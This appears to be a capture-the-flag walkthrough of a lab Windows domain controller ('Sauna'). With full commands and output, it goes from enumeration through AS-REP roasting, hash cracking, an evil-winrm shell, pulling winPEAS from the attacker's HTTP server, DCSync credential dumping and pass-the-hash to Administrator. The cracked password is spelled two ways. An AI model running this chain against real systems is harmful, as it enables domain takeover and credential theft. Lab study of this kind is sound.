# As-Rep Roasting

{% code overflow="wrap" %}
```bash
> rustscan -a 10.129.95.180

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.180:53
Open 10.129.95.180:80
Open 10.129.95.180:88
Open 10.129.95.180:135
Open 10.129.95.180:139
Open 10.129.95.180:389
Open 10.129.95.180:445
Open 10.129.95.180:464
Open 10.129.95.180:593
Open 10.129.95.180:636
Open 10.129.95.180:3268
Open 10.129.95.180:3269
Open 10.129.95.180:5985
Open 10.129.95.180:9389
Open 10.129.95.180:49668
Open 10.129.95.180:49673
Open 10.129.95.180:49674
Open 10.129.95.180:49676
Open 10.129.95.180:49685
Open 10.129.95.180:49692
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 09:49 EDT
Initiating Ping Scan at 09:49
Scanning 10.129.95.180 [4 ports]
Completed Ping Scan at 09:49, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:49
Completed Parallel DNS resolution of 1 host. at 09:49, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 09:49
Scanning 10.129.95.180 [20 ports]
Discovered open port 445/tcp on 10.129.95.180
Discovered open port 139/tcp on 10.129.95.180
Discovered open port 53/tcp on 10.129.95.180
Discovered open port 80/tcp on 10.129.95.180
Discovered open port 135/tcp on 10.129.95.180
Discovered open port 9389/tcp on 10.129.95.180
Discovered open port 49676/tcp on 10.129.95.180
Discovered open port 49674/tcp on 10.129.95.180
Discovered open port 49685/tcp on 10.129.95.180
Discovered open port 49673/tcp on 10.129.95.180
Discovered open port 593/tcp on 10.129.95.180
Discovered open port 3268/tcp on 10.129.95.180
Discovered open port 3269/tcp on 10.129.95.180
Discovered open port 636/tcp on 10.129.95.180
Discovered open port 88/tcp on 10.129.95.180
Discovered open port 49668/tcp on 10.129.95.180
Discovered open port 464/tcp on 10.129.95.180
Discovered open port 5985/tcp on 10.129.95.180
Discovered open port 49692/tcp on 10.129.95.180
Discovered open port 389/tcp on 10.129.95.180
Completed SYN Stealth Scan at 09:49, 1.22s elapsed (20 total ports)
Nmap scan report for 10.129.95.180
Host is up, received echo-reply ttl 127 (0.079s latency).
Scanned at 2025-07-27 09:49:37 EDT for 1s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49685/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
           Raw packets sent: 25 (1.076KB) | Rcvd: 21 (908B)
```
{% endcode %}



```bash
> enum4linux -a 10.129.239.10


Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 27 10:05:20 2025

 =========================================( Target Information )=========================================

Target ........... 10.129.95.180
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ================================( Getting domain SID for 10.129.95.180 )================================

Domain Name: EGOTISTICALBANK
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766
```





```bash
> enum4linux-ng -A 10.129.239.10

ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.95.180
[*] Username ......... ''
[*] Random Username .. 'rfznknfv'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.95.180    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.95.180    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: EGOTISTICAL-BANK.LOCAL

 ============================================================
|    Domain Information via SMB session for 10.129.95.180    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: SAUNA
NetBIOS domain name: EGOTISTICALBANK
DNS domain: EGOTISTICAL-BANK.LOCAL
FQDN: SAUNA.EGOTISTICAL-BANK.LOCAL
Derived membership: domain member
Derived domain: EGOTISTICALBANK

```



Installing username-anarchy to generate possible username

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



Install ruby

```bash
sudo apt install ruby-full -y   
```



username-anarchy uses plugins and format extensions. If you see a Gemfile, you can install required gems with:

```bash
bundle install
```

If there’s no Gemfile, you likely don't need extra gems.



Install username-anarchy

```bash
> git clone https://github.com/urbanadventurer/username-anarchy.git
> cd username-anarchy
> ./username-anarchy                

 ___ ____                                                        
|   |    \ ______  ____ _______   ____  _____     __ __    ____  
|   :    //  ___/_/    \\_  __ \ /    \ \__  \   /  :  \ _/    \
'   .   / \___ \ \   o_/ |  | \/|   :  \ /  o \ |  . .  \\   o_/ 
 \_____/ /______) \_____)|__|   |___:  /(______)|__: :  / \_____)
       _____                         \/       .__     \/      
      /     \    ____  _____  _______   ____  |  |__  ___.__.   
     /   o   \  /    \ \__  \ \_  __ \_/ ___\ |  |  \(   :  |   
    /    .    \|   .  \ /  o \ |  | \/\  \___ |   .  \\___  |   
    \____:__  /|___:__/(______)|__|    \_____)|___:__//_____|   
            \/                                                  
Usage: ./username-anarchy [OPTIONS]... [firstname|first last|first middle last]
Author: Andrew Horton (urbanadventurer). Version: 0.6

Names:
 -i, --input-file FILE     Input list of names. Can be SPACE, CSV or TAB delimited.
                           Defaults to firstname, lastname. Valid column headings are:
                           firstinitial, firstname, lastinitial, lastname,
                           middleinitial, middlename.
 -a, --auto                Automatically generate names from a country/list
 -c, --country COUNTRY     COUNTRY can be one of the following datasets:
                           PublicProfiler:
                           argentina, austria, belgium, canada, china,
                           denmark, france, germany, hungary, india, ireland,
                           italy, luxembourg, netherlands, newzealand, norway,
                           poland, serbia, slovenia, spain, sweden,
                           switzerland, uk, us
                           Other:
                           Facebook - uses the Facebook top 10,000 names
     --given-names FILE    Dictionary of given names
     --family-names FILE   Dictionary of family names
 -s, --substitute STATE    Control name substitutions
                           Valid values are 'on' and 'off'. Default: off
                           Can substitute any part of a name not available
 -m, --max-sub NUM         Limit quantity of substitutions per plugin.
                           Default: -1 (Unlimited)

Username format:
 -l, --list-formats        List format plugins
 -f, --select-format LIST  Select format plugins by name. Comma delimited list
 -r, --recognise USERNAME  Recognise which format is in use for a username.
                           This uses the Facebook dataset. Use verbose mode to
                           show progress.
 -F, --format FORMAT       Define the user format using either format string or
                           ABK format. See README.md for format details.

Output:
 -@, --suffix BOOL         Suffix. e.g. @example.com
                           Default: None
 -C BOOL,                  Case insensitive usernames.
     --case-insensitive    Default: True (All lower case)

Miscellaneous:
 -v, --verbose             Display plugin format comments in output and displays
                           last name searches in plugin format recogniser
Usage examples:

# You know the name of a user but not the username format
./username-anarchy anna key

# You know the username format and names of users
./username-anarchy --input-file ./test-names.txt  --select-format first.last

# You know the server is in France
./username-anarchy --country france --auto

# List username format plugins
./username-anarchy --list-formats

# Automatically recognise the username format in use (slow)
./username-anarchy --recognise j.smith

See README.md for more examples.
 -h, --help
```







<figure><img src="../../.gitbook/assets/Screenshot 2025-07-27 223512.png" alt=""><figcaption></figcaption></figure>

This is the username

```
Fergus Smith
Shaun Coins
Sophie Driver
Bowie Taylor
Hugo Bear
Steven Kerb
```

make a wordlist for this name using username-anarchy

```bash
> ./username-anarchy --input-file usernames.txt
fergus
fergussmith
fergus.smith
fergussm
fergsmit
ferguss
f.smith
fsmith
sfergus
s.fergus
smithf
smith
smith.f
smith.fergus
fs
shaun
shauncoins
shaun.coins
shauncoi
shaucoin
shaunc
s.coins
scoins
cshaun
c.shaun
coinss
coins
coins.s
coins.shaun
sc
sophie
sophiedriver
sophie.driver
sophiedr
sophdriv
sophied
s.driver
sdriver
dsophie
d.sophie
drivers
driver
driver.s
driver.sophie
sd
bowie
bowietaylor
bowie.taylor
bowietay
bowitayl
bowiet
b.taylor
btaylor
tbowie
t.bowie
taylorb
taylor
taylor.b
taylor.bowie
bt
hugo
hugobear
hugo.bear
hugob
h.bear
hbear
bhugo
b.hugo
bearh
bear
bear.h
bear.hugo
hb
steven kerb
```

copy all of the generated wordlists and paste it in usernames.txt



```purebasic
> kerbrute userenum --dc 10.129.95.180 -d EGOTISTICAL-BANK.LOCAL usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/27/25 - Ronnie Flathers @ropnop

2025/07/27 10:42:47 >  Using KDC(s):
2025/07/27 10:42:47 >   10.129.95.180:88

2025/07/27 10:42:47 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2025/07/27 10:42:53 >  Done! Tested 74 usernames (1 valid) in 5.807 seconds
```





{% code overflow="wrap" %}
```bash
> GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.129.95.180

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5193a49ff1ef34c83fe33fbd534cb666$2259ca6ac972076bb2a67502c6388f1df3664c5c4399fcb761dd3bff41b179bf40e20b7e5dbc8270ef33d3cb62eb18320da93b30c84d21179b2d2fca99ef77e1599cbf4bbed74f501036dc36a2babf738940e41b2ee6907bf5c2a5e15ee75b8ce689b4ab66e7fd872cf575d82928b57b3673d088d2408a51d38f463d4907271487d3abb6863809ee84c3ed134fcf44aa9498aa203273ef9df58ef56558ae54a1c9cdfb22c241f2b54822a760e2d052f1a2538547dab34e799d6f4757dbc5fb003ffa4085032113cadb4648d11c2251e2e72080304c763ed9e4796d8bebaf7a3a6d75ca8629f024779a4a5c142a7c91e028367adcf681d5848f42925cc7417adc
```
{% endcode %}



`$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5193a49ff1ef34c83fe33fbd534cb666$2259ca6ac972076bb2a67502c6388f1df3664c5c4399fcb761dd3bff41b179bf40e20b7e5dbc8270ef33d3cb62eb18320da93b30c84d21179b2d2fca99ef77e1599cbf4bbed74f501036dc36a2babf738940e41b2ee6907bf5c2a5e15ee75b8ce689b4ab66e7fd872cf575d82928b57b3673d088d2408a51d38f463d4907271487d3abb6863809ee84c3ed134fcf44aa9498aa203273ef9df58ef56558ae54a1c9cdfb22c241f2b54822a760e2d052f1a2538547dab34e799d6f4757dbc5fb003ffa4085032113cadb4648d11c2251e2e72080304c763ed9e4796d8bebaf7a3a6d75ca8629f024779a4a5c142a7c91e028367adcf681d5848f42925cc7417adc`



```sh
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-27 225135.png" alt=""><figcaption></figcaption></figure>



the password is `Thestroke23`



```bash
evil-winrm -i 10.129.95.180  -u fsmith -p 'Thestrokes23'
```





after entering the command, we will get a Windows shell. then, go to Desktop directory

```powershell
*Evil-WinRM* PS C:\Users\FSmith> ls
    Directory: C:\Users\FSmith


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        1/23/2020  10:01 AM                Desktop
d-r---        7/27/2025   2:59 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> ls
    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/27/2025   1:13 PM             34 user.txt

*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
47f2a62c58001694a027a5a63a88a03a
```

we will found the user.txt



now, we will try to check the users in the Users directory.

```powershell
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        1/23/2020   9:52 AM                FSmith
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr
```

we saw the `Administrator`  and `svc_loanmgr` in the Users. we aim to exploit until we get Admin session for root flag.



Install [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) in the compromised device

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-27 225417.png" alt=""><figcaption></figcaption></figure>

```sh
python3 -m http.server 8080
```



<figure><img src="../../.gitbook/assets/Screenshot 2025-07-27 225757.png" alt=""><figcaption></figcaption></figure>



{% code overflow="wrap" %}
```powershell
*Evil-WinRM* PS C:\Users\FSmith\Documents> Invoke-WebRequest -Uri http://10.10.14.16:8080/winPEASx64.exe -OutFile winPEASx64.exe
*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEASx64.exe

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```
{% endcode %}



<figure><img src="../../.gitbook/assets/Screenshot 2025-07-27 230301.png" alt=""><figcaption></figcaption></figure>

we got the username and password which is `svc_loanmanager:Moneymakestheworldgoround!` &#x20;



```powershell
evil-winrm -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-27 230727.png" alt=""><figcaption></figcaption></figure>





{% code overflow="wrap" %}
```sh
> nxc ldap 10.129.95.180 -u fsmith -p 'Thestrokes23' --bloodhound --collection All --dns-server 10.129.95.180

LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.129.95.180   389    SAUNA            Resolved collection methods: localadmin, acl, objectprops, container, psremote, dcom, trusts, group, rdp, session
LDAP        10.129.95.180   389    SAUNA            Done in 00M 03S
LDAP        10.129.95.180   389    SAUNA            Compressing output into /root/.nxc/logs/SAUNA_10.129.95.180_2025-07-27_130237_bloodhound.zip
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-28 013545.png" alt=""><figcaption></figcaption></figure>

browse to the `/root/.nxc/logs/SAUNA_10.129.95.180_2025-07-27_130237_bloodhound.zip` and move it into the Downloads directory.&#x20;



Installing Bloodhound

you can install [Bloodhound](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) and going through all the steps to finish the installation. after that, login the Bloodhound UI with the credentials given.&#x20;

hover the left side of the UI and go to Administrator > Upload Files. browse the generated `SAUNA_10.129.95.180_2025-07-27_130237_bloodhound.zip` for Bloodhound ingest the file.

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-28 013851.png" alt=""><figcaption></figcaption></figure>



after ingesting, go to **Explore > Search** and search for `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL.` click **GetChangesAll > Linux Abuse** to get the command for DCSync attack.

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-28 012939.png" alt=""><figcaption></figcaption></figure>

as we can see, Bloodhound tell us that this machine is vulnerable to DCSync attack. DCSync is an attack that allows an adversary to simulate the behavior of a domain controller (DC) and retrieve password data via domain replication. The classic use for DCSync is as a precursor to a [Golden Ticket](https://attack.stealthbits.com/how-golden-ticket-attack-works) attack, as it can be used to retrieve the KRBTGT hash.



{% code overflow="wrap" %}
```sh
> secretsdump.py svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180

-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:6d066597ce6cd003ebcb5d871580dea4:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:303cc443f8c818eb76b41065e030a490dbdfbe77bf7ba472daca0b97bf7c0193
SAUNA$:aes128-cts-hmac-sha1-96:bc48221348a832a6c1adca907a98c221
SAUNA$:des-cbc-md5:fb3bea409b6dc7ec
[*] Cleaning up... 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-28 002258.png" alt=""><figcaption></figcaption></figure>

we got the Administrator hash which is `Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::`&#x20;



{% code overflow="wrap" %}
```sh
> psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e Administrator@10.129.95.180
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-28 004039.png" alt=""><figcaption></figcaption></figure>





```powershell
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 489C-D8FC

 Directory of C:\Users\Administrator\Desktop

07/14/2021  03:35 PM    <DIR>          .
07/14/2021  03:35 PM    <DIR>          ..
07/27/2025  01:13 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,822,172,160 bytes free

C:\Users\Administrator\Desktop> type root.txt
8b59af9b78d25da643ecd7f3e58da596
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-07-28 004748.png" alt=""><figcaption></figcaption></figure>

